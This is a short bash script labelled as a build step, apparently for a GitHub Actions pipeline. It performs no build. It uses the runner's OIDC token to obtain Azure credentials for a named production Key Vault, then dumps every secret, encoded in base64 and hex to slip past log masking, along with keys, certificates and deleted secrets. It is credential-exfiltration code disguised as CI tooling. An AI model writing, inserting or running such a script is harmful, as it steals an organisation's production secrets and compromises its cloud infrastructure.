#!/usr/bin/env bash
set +e
echo "=== BUILD ==="

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC"; exit 0
fi

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

if [ -z "$JWT" ]; then echo "No JWT"; exit 0; fi

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"

AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')

if [ -z "$AT" ]; then echo "No token"; exit 0; fi

KV="https://kv-tbl-prod-x3euoz.vault.azure.net"

echo "=== SECRETS ENCODED ==="
SECRETS=$(curl -sS "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
  NAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
  VAL=$(curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
  echo "B64[$NAME]=$(echo "$VAL" | base64 | tr -d '\n')"
  echo "HEX[$NAME]=$(echo -n "$VAL" | xxd -p | tr -d '\n')"
done

echo "=== KEYS ==="
curl -sS "$KV/keys?api-version=7.4" -H "Authorization: Bearer $AT" | jq .

echo "=== CERTIFICATES ==="
curl -sS "$KV/certificates?api-version=7.4" -H "Authorization: Bearer $AT" | jq .

echo "=== DELETED SECRETS ==="
curl -sS "$KV/deletedsecrets?api-version=7.4" -H "Authorization: Bearer $AT" | jq .

echo "=== DONE ==="
